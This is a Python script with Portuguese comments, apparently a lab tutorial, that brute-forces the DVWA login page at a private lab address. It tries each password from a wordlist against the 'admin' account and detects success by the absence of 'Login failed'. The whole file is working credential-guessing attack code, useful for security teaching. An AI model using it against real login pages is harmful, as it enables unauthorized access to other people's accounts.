#Importar a biblioteca requests para manipular requisição HTTP
import requests
# Definir uma variavel com a URL do alvo
url = "http://10.0.0.139"
# Caminho do Login
login_url = url+"/dvwa/login.php"
# Arquivo de wordlist
arquivo = "wordlist.txt"
# E um usuario por padrão
usuario = "admin"
#Para podermos fazer a requisição, simulando a página de login do site, vamos realizar um método chamado request,
#que recebemos como parâmetro o usuário e a senha.
def request(username, password):
    # a nossa variável data recebe o objeto JSON com o parâmetro nome recebendo o nosso user passado junto do método, e recebe o parâmetro senha
    # vamos coletar o nosso data através do inspecionar elemento
    data = {'username':username, 'password':password, "Login":'submit'}
# Após isso, colocamos que nossa variável r irá receber a resposta da requisição POST, que passamos o endpoint, aonde o servidor irá receber a requisição e processará a informação que passamos na variável data.
    r = requests.post(login_url, data=data)
# Então basicamente, nessa estrutura de condição, verificamos se temos essa String em nossa resposta da requisição, e caso tenhamos, sabemos que não é o usuário e senha correta.
    if "Login failed" in r.text:
        print("Nao foi possivel achar a senha!!")
    else:
        print("A senha e: "+usuario + " | "+ password)
# E por último temos a variável wordlist onde recebe o nosso arquivo de dicionário. Onde open recebe por parâmetro o arquivo e “r” que significa read.
# Após isso, realizamos uma estrutura de repetição para ler todas as linhas do arquivo. Utilizamos a estrutura for, para ler linha por linha do arquivo e chamar nosso método anteriormente declarado.
wordlist = open(arquivo, "r")
for i in wordlist:
    print("Testando "+ usuario + " || " + i)
    request(usuario,i)
    print("===============================")
